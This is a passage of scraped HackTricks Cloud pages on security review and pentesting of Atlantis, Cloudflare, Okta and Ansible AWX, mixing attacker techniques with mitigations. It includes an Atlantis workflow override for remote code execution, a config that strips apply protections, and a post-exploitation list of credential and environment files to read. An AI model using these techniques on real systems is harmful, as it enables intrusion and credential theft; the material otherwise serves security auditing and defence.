that\nallowed_overrides\nspecifies also\nworkflow\nto\noverride the workflow\nthat is going to be used.\nThis will basically give\nRCE in the Atlantis server to any user that can access that repo\n.\n# atlantis.yaml\nversion\n:\n3\nprojects\n:\n-\ndir\n:\n.\nworkflow\n:\ncustom1\nworkflows\n:\ncustom1\n:\nplan\n:\nsteps\n:\n-\ninit\n-\nrun\n:\nmy custom plan command\napply\n:\nsteps\n:\n-\nrun\n:\nmy custom apply command\nBypass plan/apply protections\nIf the\nserver side config\nflag\nallowed_overrides\nhas\napply_requirements\nconfigured, it's possible for a repo to\nmodify the plan/apply protections to bypass them\n.\nrepos\n:\n-\nid\n:\n/.\n*/\napply_requirements\n:\n[]\nPR Hijacking\nIf someone sends\natlantis plan/apply\ncomments on your valid pull requests,\nit will cause terraform to run when you don't want it to.\nMoreover, if you don't have configured in the\nbranch protection\nto ask to\nreevaluate\nevery PR when a\nnew commit is pushed\nto it, someone could\nwrite malicious configs\n(check previous scenarios) in the terraform config, run\natlantis plan/apply\nand gain RCE.\nThis is the\nsetting\nin Github branch protections:\nWebhook Secret\nIf you manage to\nsteal the webhook secret\nused or if there\nisn't any webhook secret\nbeing used, you could\ncall the Atlantis webhook\nand\ninvoke atlatis commands\ndirectly.\nBitbucket\nBitbucket Cloud does\nnot support webhook secrets\n. This could allow attackers to\nspoof requests from Bitbucket\n. Ensure you are allowing only Bitbucket IPs.\nThis means that an\nattacker\ncould make\nfake requests to Atlantis\nthat look like they're coming from Bitbucket.\nIf you are specifying\n--repo-allowlist\nthen they could only fake requests pertaining to those repos so the most damage they could do would be to plan/apply on your own repos.\nTo prevent this, allowlist\nBitbucket's IP addresses\n(see Outbound IPv4 addresses).\nPost-Exploitation\nIf you managed to get access to the server or at least you got a LFI there are some interesting things you should try to read:\n/home/atlantis/.git-credentials\nContains vcs access credentials\n/atlantis-data/atlantis.db\nContains vcs access credentials with more info\n/atlantis-data/repos/<org_name>\n/\n<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate\nTerraform stated file\nExample: /atlantis-data/repos/ghOrg_/_myRepo/20/default/env/prod/.terraform/terraform.tfstate\n/proc/1/environ\nEnv variables\n/proc/[2-20]/cmdline\nCmd line of\natlantis server\n(may contain sensitive data)\nMitigations\nDon't Use On Public Repos\nBecause anyone can comment on public pull requests, even with all the security mitigations available, it's still dangerous to run Atlantis on public repos without proper configuration of the security settings.\nDon't Use\n--allow-fork-prs\nIf you're running on a public repo (which isn't recommended, see above) you shouldn't set\n--allow-fork-prs\n(defaults to false) because anyone can open up a pull request from their fork to your repo.\n--repo-allowlist\nAtlantis requires you to specify a allowlist of repositories it will accept webhooks from via the\n--repo-allowlist\nflag. For example:\nSpecific repositories:\n--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests\nYour whole organization:\n--repo-allowlist=github.com/runatlantis/*\nEvery repository in your GitHub Enterprise install:\n--repo-allowlist=github.yourcompany.com/*\nAll repositories:\n--repo-allowlist=*\n. Useful for when you're in a protected network but dangerous without also setting a webhook secret.\nThis flag ensures your Atlantis install isn't being used with repositories you don't control. See\natlantis server --help\nfor more details.\nProtect Terraform Planning\nIf attackers submitting pull requests with malicious Terraform code is in your threat model then you must be aware that\nterraform apply\napprovals are not enough. It is possible to run malicious code in a\nterraform plan\nusing the\nexternal\ndata source\nor by specifying a malicious provider. This code could then exfiltrate your credentials.\nTo prevent this, you could:\n1.\nBake providers into the Atlantis image or host and deny egress in production.\n2.\nImplement the provider registry protocol internally and deny public egress, that way you control who has write access to the registry.\n3.\nModify your\nserver-side repo configuration\n's\nplan\nstep to validate against the use of disallowed providers or data sources or PRs from not allowed users. You could also add in extra validation at this point, e.g. requiring a \"thumbs-up\" on the PR before allowing the\nplan\nto continue. Conftest could be of use here.\nWebhook Secrets\nAtlantis should be run with Webhook secrets set via the\n$ATLANTIS_GH_WEBHOOK_SECRET\n/\n$ATLANTIS_GITLAB_WEBHOOK_SECRET\nenvironment variables. Even with the\n--repo-allowlist\nflag set, without a webhook secret, attackers could make requests to Atlantis posing as a repository that is allowlisted. Webhook secrets ensure that the webhook requests are actually coming from your VCS provider (GitHub or GitLab).\nIf you are using Azure DevOps, instead of webhook secrets add a basic username and password.\nAzure DevOps Basic Authentication\nAzure DevOps supports sending a basic authentication header in all webhook events. This requires using an HTTPS URL for your webhook location.\nSSL/HTTPS\nIf you're using webhook secrets but your traffic is over HTTP then the webhook secrets could be stolen. Enable SSL/HTTPS using the\n--ssl-cert-file\nand\n--ssl-key-file\nflags.\nEnable Authentication on Atlantis Web Server\nIt is very recommended to enable authentication in the web service. Enable BasicAuth using the\n--web-basic-auth=true\nand setup a username and a password using\n--web-username=yourUsername\nand\n--web-password=yourPassword\nflags.\nYou can also pass these as environment variables\nATLANTIS_WEB_BASIC_AUTH=true\nATLANTIS_WEB_USERNAME=yourUsername\nand\nATLANTIS_WEB_PASSWORD=yourPassword\n.\nReferences\n​\nhttps://www.runatlantis.io/docs\n​\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPrevious\nTerraform Enterprise Security\nNext\n- Pentesting CI/CD\nCloudflare Security\nLast modified\n5mo ago"
    },
    {
        "title": "Cloudflare Security",
        "url": "https://cloud.hacktricks.xyz/pentesting-ci-cd/cloudflare-security",
        "text": "Cloudflare Security\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nIn a Cloudflare account there are some\ngeneral settings and services\nthat can be configured. In this page we are going to\nanalyze the security related settings of each section:\nWebsites\nReview each with:\nCloudflare Domains\nDomain Registration\nIn\nTransfer Domains\ncheck that it's not possible to transfer any domain.\nReview each with:\nCloudflare Domains\nAnalytics\nI couldn't find anything to check for a config security review.\nPages\nOn each Cloudflare's page:\nCheck for\nsensitive information\nin the\nBuild log\n.\nCheck for\nsensitive information\nin the\nGithub repository\nassigned to the pages.\nCheck for potential github repo compromise via\nworkflow command injection\nor\npull_request_target\ncompromise. More info in the\nGithub Security page\n.\nCheck for\nvulnerable functions\nin the\n/fuctions\ndirectory (if any), check the\nredirects\nin the\n_redirects\nfile (if any) and\nmisconfigured headers\nin the\n_headers\nfile (if any).\nCheck for\nvulnerabilities\nin the\nweb page\nvia\nblackbox\nor\nwhitebox\nif you can\naccess the code\nIn the details of each page\n/<page_id>/pages/view/blocklist/settings/functions\n. Check for\nsensitive information\nin the\nEnvironment variables\n.\nIn the details page check also the\nbuild command\nand\nroot directory\nfor\npotential injections\nto compromise the page.\nWorkers\nOn each Cloudflare's worker check:\nThe triggers: What makes the worker trigger? Can a\nuser send data\nthat will be\nused\nby the worker?\nIn the\nSettings\n, check for\nVariables\ncontaining\nsensitive information\nCheck the\ncode of the worker\nand search for\nvulnerabilities\n(specially in places where the user can manage the input)\nCheck for SSRFs returning the indicated page that you can control\nCheck XSSs executing JS inside a svg image\nNote that by default a\nWorker is given a URL\nsuch as\n<worker-name>.<account>.workers.dev\n. The user can set it to a\nsubdomain\nbut you can always access it with that\noriginal URL\nif you know it.\nR2\nTODO\nStream\nTODO\nImages\nTODO\nSecurity Center\nIf possible, run a\nSecurity Insights\nscan\nand an\nInfrastructure\nscan\n, as they will\nhighlight\ninteresting information\nsecurity\nwise.\nJust\ncheck this information\nfor security misconfigurations and interesting info\nTurnstile\nTODO\nZero Trust\nCloudflare Zero Trust Network\nBulk Redirects\nUnlike\nDynamic Redirects\n,\nBulk Redirects\nare essentially static — they do\nnot support any string replacement\noperations or regular expressions. However, you can configure URL redirect parameters that affect their URL matching behavior and their runtime behavior.\nCheck that the\nexpressions\nand\nrequirements\nfor redirects\nmake sense\n.\nCheck also for\nsensitive hidden endpoints\nthat you contain interesting info.\nNotifications\nCheck the\nnotifications.\nThese notifications are recommended for security:\nUsage Based Billing\nHTTP DDoS Attack Alert\nLayer 3/4 DDoS Attack Alert\nAdvanced HTTP DDoS Attack Alert\nAdvanced Layer 3/4 DDoS Attack Alert\nFlow-based Monitoring: Volumetric Attack\nRoute Leak Detection Alert\nAccess mTLS Certificate Expiration Alert\nSSL for SaaS Custom Hostnames Alert\nUniversal SSL Alert\nScript Monitor New Code Change Detection Alert\nScript Monitor New Domain Alert\nScript Monitor New Malicious Domain Alert\nScript Monitor New Malicious Script Alert\nScript Monitor New Malicious URL Alert\nScript Monitor New Scripts Alert\nScript Monitor New Script Exceeds Max URL Length Alert\nAdvanced Security Events Alert\nSecurity Events Alert\nCheck all the\ndestinations\n, as there could be\nsensitive info\n(basic http auth) in webhook urls. Make also sure webhook urls use\nHTTPS\nAs extra check, you could try to\nimpersonate a cloudflare notification\nto a third party, maybe you can somehow\ninject something dangerous\nManage Account\nIt's possible to see the\nlast 4 digits of the credit card\n,\nexpiration\ntime and\nbilling address\nin\nBilling\n->\nPayment info\n.\nIt's possible to see the\nplan type\nused in the account in\nBilling\n->\nSubscriptions\n.\nIn\nMembers\nit's possible to see all the members of the account and their\nrole\n. Note that if the plan type isn't Enterprise, only 2 roles exist: Administrator and Super Administrator. But if the used\nplan is Enterprise\n,\nmore roles\ncan be used to follow the least privilege principle.\nTherefore, whenever possible is\nrecommended\nto use the\nEnterprise plan\n.\nIn Members it's possible to check which\nmembers\nhas\n2FA enabled\n.\nEvery\nuser should have it enabled.\nNote that fortunately the role\nAdministrator\ndoesn't give permissions to manage memberships (\ncannot escalate privs or invite\nnew members)\nDDoS Investigation\n​\nCheck this part\n.\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPentesting CI/CD -\nPrevious\nAtlantis Security\nNext\nCloudflare Domains\nLast modified\n1mo ago"
    },
    {
        "title": "Okta Security",
        "url": "https://cloud.hacktricks.xyz/pentesting-ci-cd/okta-security",
        "text": "Okta Security\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nBasic Information\nOkta, Inc. is an\nidentity and access management company\nthat provides cloud software to help companies\nmanage and secure user authentication into modern applications\n, and for developers to build identity controls into applications, website web services and devices.\nTheir core service, called the Okta Identity Cloud, offers products that include single sign-on (SSO), multi-factor authentication (MFA), lifecycle management, universal directory, API access management, and more. This helps companies to both protect their sensitive data and also streamline user access, making applications and services more accessible and easy to use for employees or customers.\nOkta's services are widely used in enterprise contexts, as well as by smaller companies and developers. It plays a crucial role in enabling businesses to securely adopt and manage cloud technologies. As of my knowledge cutoff in September 2021, Okta remains a significant player in the Identity and Access Management (IAM) industry.\nThe main gola of Okta is to configure access to different users and groups to external applications. If you manage to\ncompromise administrator privileges in an Oktas\nenvironment, you will highly probably able to\ncompromise all the other platforms the company is using\n.\nTo perform a security review of an Okta environment you should ask for\nadministrator read-only access\n.\nSummary\nThere are\nusers\n(which can be\nstored in Okta,\nlogged from configured\nIdentity Providers\nor authenticated via\nActive Directory\nor LDAP). \nThese users can be inside\ngroups\n.\nThere are also\nauthenticators\n: different options to authenticate like password, and several 2FA like WebAuthn, email, phone, okta verify (they could be enabled or disabled)...\nThen, there are\napplications\nsyncronized with Okta. Each applications will have some\nmapping with Okta\nto share information (such as email addresses, first names...). Moreover, each application must be inside an\nAuthentication Policy\n, which indicates the\nneeded authenticators\nfor a user to\naccess\nthe application.\nThe most powerful role is\nSuper Administrator\n.\nIf an attacker compromise Okta with Administrator access, all the\napps trusting Okta\nwill be highly probably\ncompromised\n.\nColleague Impersonation Attack\nThe\nattributes that each user can have and modify\n(like email or first name) can be configured in Okta. If an\napplication\nis\ntrusting\nas ID an\nattribute\nthat the user can\nmodify\n, he will be able to\nimpersonate other users in that platform\n.\nTherefore, if the app is trusting the field\nuserName\n, you probably won't be able to change it (because you usually cannot change that field), but if it's trusting for example\nprimaryEmail\nyou might be able to\nchange it to a colleagues email address\nand impersonate it (you will need to have access to the email and accept the change).\nNote that this impersoantion depends on how each application was condigured. Only the ones trusting the field you modified and accepting updates will be compromised.\nTherefore, the app should have this field enabled if it exists:\nI have also seen other apps that were vulnerable but didn't have that field in the Okta settings (at the end different apps are configured differently).\nThe best way to find out if you could impersonate anyone on each app would be to try it!\nDirectory\nPeople\nFrom an attackers perspective, this is super interesting as you will be able to see\nall the users registered\n, their\nemail\naddresses, the\ngroups\nthey are part of,\nprofiles\nand even\ndevices\n(mobiles along with their OSs).\nFor a whitebox review check that there aren't several \"\nPending user action\n\" and \"\nPassword reset\n\".\nGroups\nThis is where you find all the created groups in Okta. it's interesting to understand the different groups (set of\npermissions\n) that could be granted to\nusers\n.\nIt's possible to see the\npeople included inside groups\nand\napps assigned\nto each group.\nOfc, any group with the name of\nadmin\nis interesting, specially the group\nGlobal Administrators,\ncheck the members to learn who are the most privileged members.\nFrom a whitebox review, there\nshouldn't be more than 5 global admins\n(better if there are only 2 or 3).\nDevices\nFind here a\nlist of all the devices\nof all the users. You can also see if it's being\nactively managed\nor not.\nProfile Editor\nHere is possible to observe how key information such as first names, last names, emails, usernames... are shared between Okta and other applications. This is interesting because if a user can\nmodify in Okta a field\n(such as his name or email) that then is used by an\nexternal application\nto\nidentify\nthe user, an insider could try to\ntake over other accounts\n.\nMoreover, in the profile\nUser (default)\nfrom Okta you can see\nwhich fields\neach\nuser\nhas and which ones are\nwritable\nby users. If you cannot see the admin panel, just go to\nupdate your profile\ninformation and you will see which fields you can update (note that to update an email address you will need to verify it).\nDirectory Integrations\nDirectories allow you to import people from existing sources. I guess here you will see the users imported from other directories.\nI haven't seen it, but I guess this is interesting to find out\nother directories that Okta is using to import users\nso if you\ncompromise that directory\nyou could set some attributes values in the users created in Okta and\nmaybe compromise the Okta env\n.\nProfile Sources\nA profile source is an\napplication that acts as a source of truth\nfor user profile attributes. A user can only be sourced by a single application or directory at a time.\nI haven't seen it, so any information about security and hacking regarding this option is appreciated.\nCustomizations\nBrands\nCheck in the\nDomains\ntab of this section the email addresses used to send emails and the custom domain inside Okta of the company (which you probably already know).\nMoreover, in the\nSetting\ntab, if you are admin, you can \"\nUse a custom sign-out page\n\" and set a custom URL.\nSMS\nNothing interesting here.\nEnd-User Dashboard\nYou can find here applications configured, but we will see the details of those later in a different section.\nOther\nInteresting setting, but nothing super interesting from a security point of view.\nApplications\nApplications\nHere you can find all the\nconfigured applications\nand their details: Who has access to them, how is it configured (SAML, OPenID), URL to login, the mappings between Okta and the application...\nIn the\nSign On\ntab there is also a field called\nPassword reveal\nthat would allow a user to\nreveal his password\nwhen checking the application settings. To check the settings of an application from the User Panel, click the 3 dots:\nAnd you could see some more details about the app (like the password reveal feature, if it's enabled):\nIdentity Governance\nAccess Certifications\nUse Access Certifications to create audit campaigns to review your users' access to resources periodically and approve or revoke access automatically when required.\nI haven't seen it used, but I guess that from a defensive point of view it's a nice feature.\nSecurity\nGeneral\nSecurity notification emails\n: All should be enabled.\nCAPTCHA integration\n: It's recommended to set at least the invisible reCaptcha\nOrganization Security\n: Everything can be enabled and activation emails shouldn't last long (7 days is ok)\nUser enumeration prevention\n: Both should be enabled\nNote that User Enumeration Prevention doesn't take effect if either of the following conditions are allowed (See\nUser management\nfor more information):\nSelf-Service Registration\nJIT flows with email authentication\nOkta ThreatInsight settings\n: Log and enforce security based on threat level\nHealthInsight\nHere is possible to find correctly and\ndangerous\nconfigured\nsettings\n.\nAuthenticators\nHere you can find all the authentication methods that a user could use: Password, phone, email, code, WebAuthn... Clicking in the Password authenticator you can see the\npassword policy\n. Check that it's strong.\nIn the\nEnrollment\ntab you can see how the ones that are required or optinal:\nIt's recommendatble to disable Phone. The strongest ones are probably a combination of password, email and WebAuthn.\nAuthentication policies\nEvery app has an authentication policy. The authentication policy verifies that users who try to sign in to the app meet specific conditions, and it enforces factor requirements based on those conditions.\nHere you can find the\nrequirements to access each application\n. It's recommended to request at least password and another method for each application. But if as attacker you find something more weak you might be able to attack it.\nGlobal Session Policy\nHere you can find the session policies assigned to different groups. For example:\nIt's recommended to request MFA, limit the session lifetime to some hours, don't persis session cookies across browser extensions and limit the location and Identity Provider (if this is possible). For example, if every user should be login from a country you could only allow this location.\nIdentity Providers\nIdentity Providers (IdPs) are services that\nmanage user accounts\n. Adding IdPs in Okta enables your end users to\nself-register\nwith your custom applications by first authenticating with a social account or a smart card.\nOn the Identity Providers page, you can add social logins (IdPs) and configure Okta as a service provider (SP) by adding inbound SAML. After you've added IdPs, you can set up routing rules to direct users to an IdP based on context, such as the user's location, device, or email domain.\nIf any identity provider is configured\nfrom an attackers and defender point of view check that configuration and\nif the source is really trustable\nas an attacker compromising it could also get access to the Okta environment.\nDelegated Authentication\nDelegated authentication allows users to sign in to Okta by entering credentials for their organization's\nActive Directory (AD) or LDAP\nserver.\nAgain, recheck this, as an attacker compromising an organizations AD could be able to pivot to Okta thanks to this setting.\nNetwork\nA network zone is a configurable boundary that you can use to\ngrant or restrict access to computers and devices\nin your organization based on the\nIP address\nthat is requesting access. You can define a network zone by specifying one or more individual IP addresses, ranges of IP addresses, or geographic locations.\nAfter you define one or more network zones, you can\nuse them in Global Session Policies\n,\nauthentication policies\n, VPN notifications, and\nrouting rules\n.\nFrom an attackers perspective it's interesting to know which Ps are allowed (and check if any\nIPs are more privileged\nthan others). From an attackers perspective, if the users should be accessing from an specific IP address or region check that this feature is used properly.\nDevice Integrations\nEndpoint Management\n: Endpoint management is a condition that can be applied in an authentication policy to ensure that managed devices have access to an application.\nI haven't seen this used yet. TODO\nNotification services\n: I haven't seen this used yet. TODO\nAPI\nYou can create Okta API tokens in this page, and see the ones that have been\ncreated\n, theirs\nprivileges\n,\nexpiration\ntime and\nOrigin URLs\n. Note that an API tokens are generated with the permissions of the user that created the token and are valid only if the\nuser\nwho created them is\nactive\n.\nThe\nTrusted Origins\ngrant access to websites that you control and trust to access your Okta org through the Okta API.\nThere shuoldn't be a lot of API tokens, as if there are an attacker could try to access them and use them.\nWorkflow\nAutomations\nAutomations allow you to create automated actions that run based on a set of trigger conditions that occur during the lifecycle of end users.\nFor example a condition could be \"User inactivity in Okta\" or \"User password expiration in Okta\" and the action could be \"Send email to the user\" or \"Change user lifecycle state in Okta\".\nReports\nReports\nDownload logs. They are\nsent\nto the\nemail address\nof the current account.\nSystem Log\nHere you can find the\nlogs of the actions performed by users\nwith a lot of details like login in Okta or in applications through Okta.\nImport Monitoring\nThis can\nimport logs from the other platforms\naccessed with Okta.\nRate limits\nCheck the API rate limits reached.\nSettings\nAccount\nHere you can find\ngeneric information\nabout the Okta environment, such as the company name, address,\nemail billing contact\n,\nemail technical contact\nand also who should receive Okta updates and which kind of Okta updates.\nDownloads\nHere you can download Okta agents to sync Okta with other technologies.\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPrevious\nCloudflare Zero Trust Network\nNext\n- Pentesting CI/CD\nAnsible Tower / AWX / Automation controller Security\nLast modified\n4mo ago"
    },
    {
        "title": "Ansible Tower / AWX / Automation controller Security",
        "url": "https://cloud.hacktricks.xyz/pentesting-ci-cd/ansible-tower-awx-automation-controller-security",
        "text": "Ansible Tower / AWX / Automation controller Security\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nBasic Information\nAnsible Tower\nor it's opensource version\nAWX\nis also known as\nAnsible’s user interface, dashboard, and REST API\n. With\nrole-based access control\n, job scheduling, and graphical inventory management, you can manage your Ansible infrastructure from a modern UI. Tower’s REST API and command-line interface make it simple to integrate it into current tools and workflows.\nAutomation Controller is a newer\nversion of Ansible Tower with more capabilities.\nDifferences\nAccording to\nthis\n, the main differences between Ansible Tower and AWS is the received support and the Ansible Tower has additional features such as role-based access control, support for custom APIs, and user-defined workflows.\nTech Stack\nWeb Interface\n: This is the graphical interface where users can manage inventories, credentials, templates, and jobs. It's designed to be intuitive and provides visualizations to help with understanding the state and results of your automation jobs.\nREST API\n: Everything you can do in the web interface, you can also do via the REST API. This means you can integrate AWX/Tower with other systems or script actions that you'd typically perform in the interface.\nDatabase\n: AWX/Tower uses a database (typically PostgreSQL) to store its configuration, job results, and other necessary operational data.\nRabbitMQ\n: This is the messaging system used by AWX/Tower to communicate between the different components, especially between the web service and the task runners.\nRedis\n: Redis serves as a cache and a backend for the task queue.\nLogical Components\nInventories\n: An inventory is a\ncollection of hosts (or nodes)\nagainst which\njobs\n(Ansible playbooks) can be\nrun\n. AWX/Tower allows you to define and group your inventories and also supports dynamic inventories which can\nfetch host lists from other systems\nlike AWS, Azure, etc.\nProjects\n: A project is essentially a\ncollection of Ansible playbooks\nsourced from a\nversion control system\n(like Git) to pull the latest playbooks when needed..\nTemplates\n: Job templates define\nhow a particular playbook will be run\n, specifying the\ninventory\n,\ncredentials\n, and other\nparameters\nfor the job.\nCredentials\n: AWX/Tower provides a secure way to\nmanage and store secrets, such as SSH keys, passwords, and API tokens\n. These credentials can be associated with job templates so that playbooks have the necessary access when they run.\nTask Engine\n: This is where the magic happens. The task engine is built on Ansible and is responsible for\nrunning the playbooks\n. Jobs are dispatched to the task engine, which then runs the Ansible playbooks against the designated inventory using the specified credentials.\nSchedulers and Callbacks\n: These are advanced features in AWX/Tower that allow\njobs to be scheduled\nto run at specific times or triggered by external events.\nNotifications\n: AWX/Tower can send notifications based on the success or failure of jobs. It supports various means of notifications such as emails, Slack messages, webhooks, etc.\nAnsible Playbooks\n: Ansible playbooks are configuration, deployment, and orchestration tools. They describe the desired state of systems in an automated, repeatable way. Written in YAML, playbooks use Ansible's declarative automation language to describe configurations, tasks, and steps that need to be executed.\nJob Execution Flow\n1.\nUser Interaction\n: A user can interact with AWX/Tower either through the\nWeb Interface\nor the\nREST API\n. These provide front-end access to all the functionalities offered by AWX/Tower.\n2.\nJob Initiation\n:\nThe user, via the Web Interface or API, initiates a job based on a\nJob Template\n.\nThe Job Template includes references to the\nInventory\n,\nProject\n(containing the playbook), and\nCredentials\n.\nUpon job initiation, a request is sent to the AWX/Tower backend to queue the job for execution.\n3.\nJob Queuing\n:\nRabbitMQ\nhandles the messaging between the web component and the task runners. Once a job is initiated, a message is dispatched to the task engine using RabbitMQ.\nRedis\nacts as the backend for the task queue, managing queued jobs awaiting execution.\n4.\nJob Execution\n:\nThe\nTask Engine\npicks up the queued job. It retrieves the necessary information from the\nDatabase\nabout the job's associated playbook, inventory, and credentials.\nUsing the retrieved Ansible playbook from the associated\nProject\n, the Task Engine runs the playbook against the specified\nInventory\nnodes using the provided\nCredentials\n.\nAs the playbook runs, its execution output (logs, facts, etc.) gets captured and stored in the\nDatabase\n.\n5.\nJob Results\n:\nOnce the playbook finishes running, the results (success, failure, logs) are saved to the\nDatabase\n.\nUsers can then view the results through the Web Interface or query them via the REST API.\nBased on job outcomes,\nNotifications\ncan be dispatched to inform users or external systems about the job's status. Notifications could be emails, Slack messages, webhooks, etc.\n6.\nExternal Systems Integration\n:\nInventories\ncan be dynamically sourced from external systems, allowing AWX/Tower to pull in hosts from sources like AWS, Azure, VMware, and more.\nProjects\n(playbooks) can be fetched from version control systems, ensuring the use of up-to-date playbooks during job execution.\nSchedulers and Callbacks\ncan be used to integrate with other systems or tools, making AWX/Tower react to external triggers or run jobs at predetermined times.\nAWX lab creation for testing\n​\nFollowing the docs\nit's possible to use docker-compose to run AWX:\ngit\nclone\n-b\nx.y.z https://github.com/ansible/awx.git\n# Get in x.y.z the latest release version\n​\ncd\nawx\n​\n# Build\nmake\ndocker-compose-build\n​\n# Run\nmake\ndocker-compose\n​\n# Or to create a more complex env\nMAIN_NODE_TYPE\n=\ncontrol\nEXECUTION_NODE_COUNT\n=\n2\nCOMPOSE_TAG\n=\ndevel\nmake\ndocker-compose\n​\n# Clean and build the UI\ndocker\nexec\ntools_awx_1\nmake\nclean-ui ui-devel\n​\n# Once migrations are completed and the UI is built, you can begin using AWX. The UI can be reached in your browser at https://localhost:8043/#/home, and the API can be found at https://localhost:8043/api/v2.\n​\n# Create an admin user\ndocker\nexec\n-ti\ntools_awx_1 awx-manage createsuperuser\n​\n# Load demo data\ndocker\nexec\ntools_awx_1 awx-manage create_preload_data\nRBAC\nSupported roles\nThe most privileged role is called\nSystem Administrator\n. Anyone with this role can\nmodify anything\n.\nFrom a\nwhite box security\nreview, you would need the\nSystem Auditor role\n, which allow to\nview all system data\nbut cannot make any changes. Another option would be to get the\nOrganization Auditor role\n, but it would be better to get the other one.\nExpand this to get detailed description of available roles\n1.\nSystem Administrator\n:\nThis is the superuser role with permissions to access and modify any resource in the system.\nThey can manage all organizations, teams, projects, inventories, job templates, etc.\n2.\nSystem Auditor\n:\nUsers with this role can view all system data but cannot make any changes.\nThis role is designed for compliance and oversight.\n3.\nOrganization Roles\n:\nAdmin\n: Full control over the organization's resources.\nAuditor\n: View-only access to the organization's resources.\nMember\n: Basic membership in an organization without any specific permissions.\nExecute\n: Can run job templates within the organization.\nRead\n: Can view the organization’s resources.\n4.\nProject Roles\n:\nAdmin\n: Can manage and modify the project.\nUse\n: Can use the project in a job template.\nUpdate\n: Can update project using SCM (source control).\n5.\nInventory Roles\n:\nAdmin\n: Can manage and modify the inventory.\nAd Hoc\n: Can run ad hoc commands on the inventory.\nUpdate\n: Can update the inventory source.\nUse\n: Can use the inventory in a job template.\nRead\n: View-only access.\n6.\nJob Template Roles\n:\nAdmin\n: Can manage and modify the job template.\nExecute\n: Can run the job.\nRead\n: View-only access.\n7.\nCredential Roles\n:\nAdmin\n: Can manage and modify the credentials.\nUse\n: Can use the credentials in job templates or other relevant resources.\nRead\n: View-only access.\n8.\nTeam Roles\n:\nMember\n: Part of the team but without any specific permissions.\nAdmin\n: Can manage the team's members and associated resources.\n9.\nWorkflow Roles\n:\nAdmin\n: Can manage and modify the workflow.\nExecute\n: Can run the workflow.\nRead\n: View-only access.\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPentesting CI/CD -\nPrevious\nOkta Security\nNext\n- Pentesting CI/CD\nTODO\nLast modified\n2mo ago"
    },
    {
        "title": "TODO",
        "url": "https://cloud.hacktricks.xyz/pentesting-ci-cd/todo",
